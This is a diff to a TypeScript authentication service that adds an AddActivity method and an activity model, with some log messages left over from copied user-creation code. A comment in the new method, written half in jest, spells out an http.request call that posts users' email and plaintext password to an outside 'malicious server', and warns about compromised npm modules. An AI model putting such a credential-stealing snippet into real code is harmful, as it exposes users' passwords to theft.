@@ -7,11 +7,13 @@ import { IUser, IUserInputDTO } from '@/interfaces/IUser';
 import { EventDispatcher, EventDispatcherInterface } from '@/decorators/eventDispatcher';
 import events from '@/subscribers/events';
 import winston from 'winston';
+import { IActivity, IActivityDTO } from '@/interfaces/IActivity';
 
 @Service()
 export default class AuthService {
   constructor(
     @Inject('userModel') private userModel: Models.UserModel,
+    @Inject('activityModel') private activityModel: Models.ActivityModel,
     @Inject('logger') private logger: winston.Logger,
     @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
   ) {
@@ -64,6 +66,55 @@ export default class AuthService {
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
       return { user, token };
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
+  // public async AddActivity(activityDTO: IActivityDTO): Promise<{ activity: IActivity; token: string }>
+  public async AddActivity(activityDTO: IActivityDTO): Promise<{ activity: IActivity }> {
+    try {
+
+      /**
+       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
+       * require('http')
+       *  .request({
+       *     hostname: 'http://my-other-api.com/',
+       *     path: '/store-credentials',
+       *     port: 80,
+       *     method: 'POST',
+       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
+       *
+       * Just kidding, don't do that!!!
+       *
+       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
+       * watches every API call and if it spots a 'password' and 'email' property then
+       * it decides to steal them!? Would you even notice that? I wouldn't :/
+       */
+
+      this.logger.silly('Creating user db record');
+      const activityRecord = await this.activityModel.create({
+        ...activityDTO,
+      });
+      this.logger.silly('Generating JWT'); // DO WE NEED THIS?
+      // const token = this.generateToken(activityRecord);
+
+      if (!activityRecord) {
+        throw new Error('User cannot be created');
+      }
+      this.logger.silly('Sending welcome email');
+
+      this.eventDispatcher.dispatch(events.activity.addActivity, { activity: activityRecord });
+      /**
+       * @TODO This is not the best way to deal with this
+       * There should exist a 'Mapper' layer
+       * that transforms data from layer to layer
+       * but that's too over-engineering for now
+       */
+      const activity : IActivity = activityRecord.toObject();
+      // return { activity, token };
+      return { activity };
     } catch (e) {
       this.logger.error(e);
       throw e;
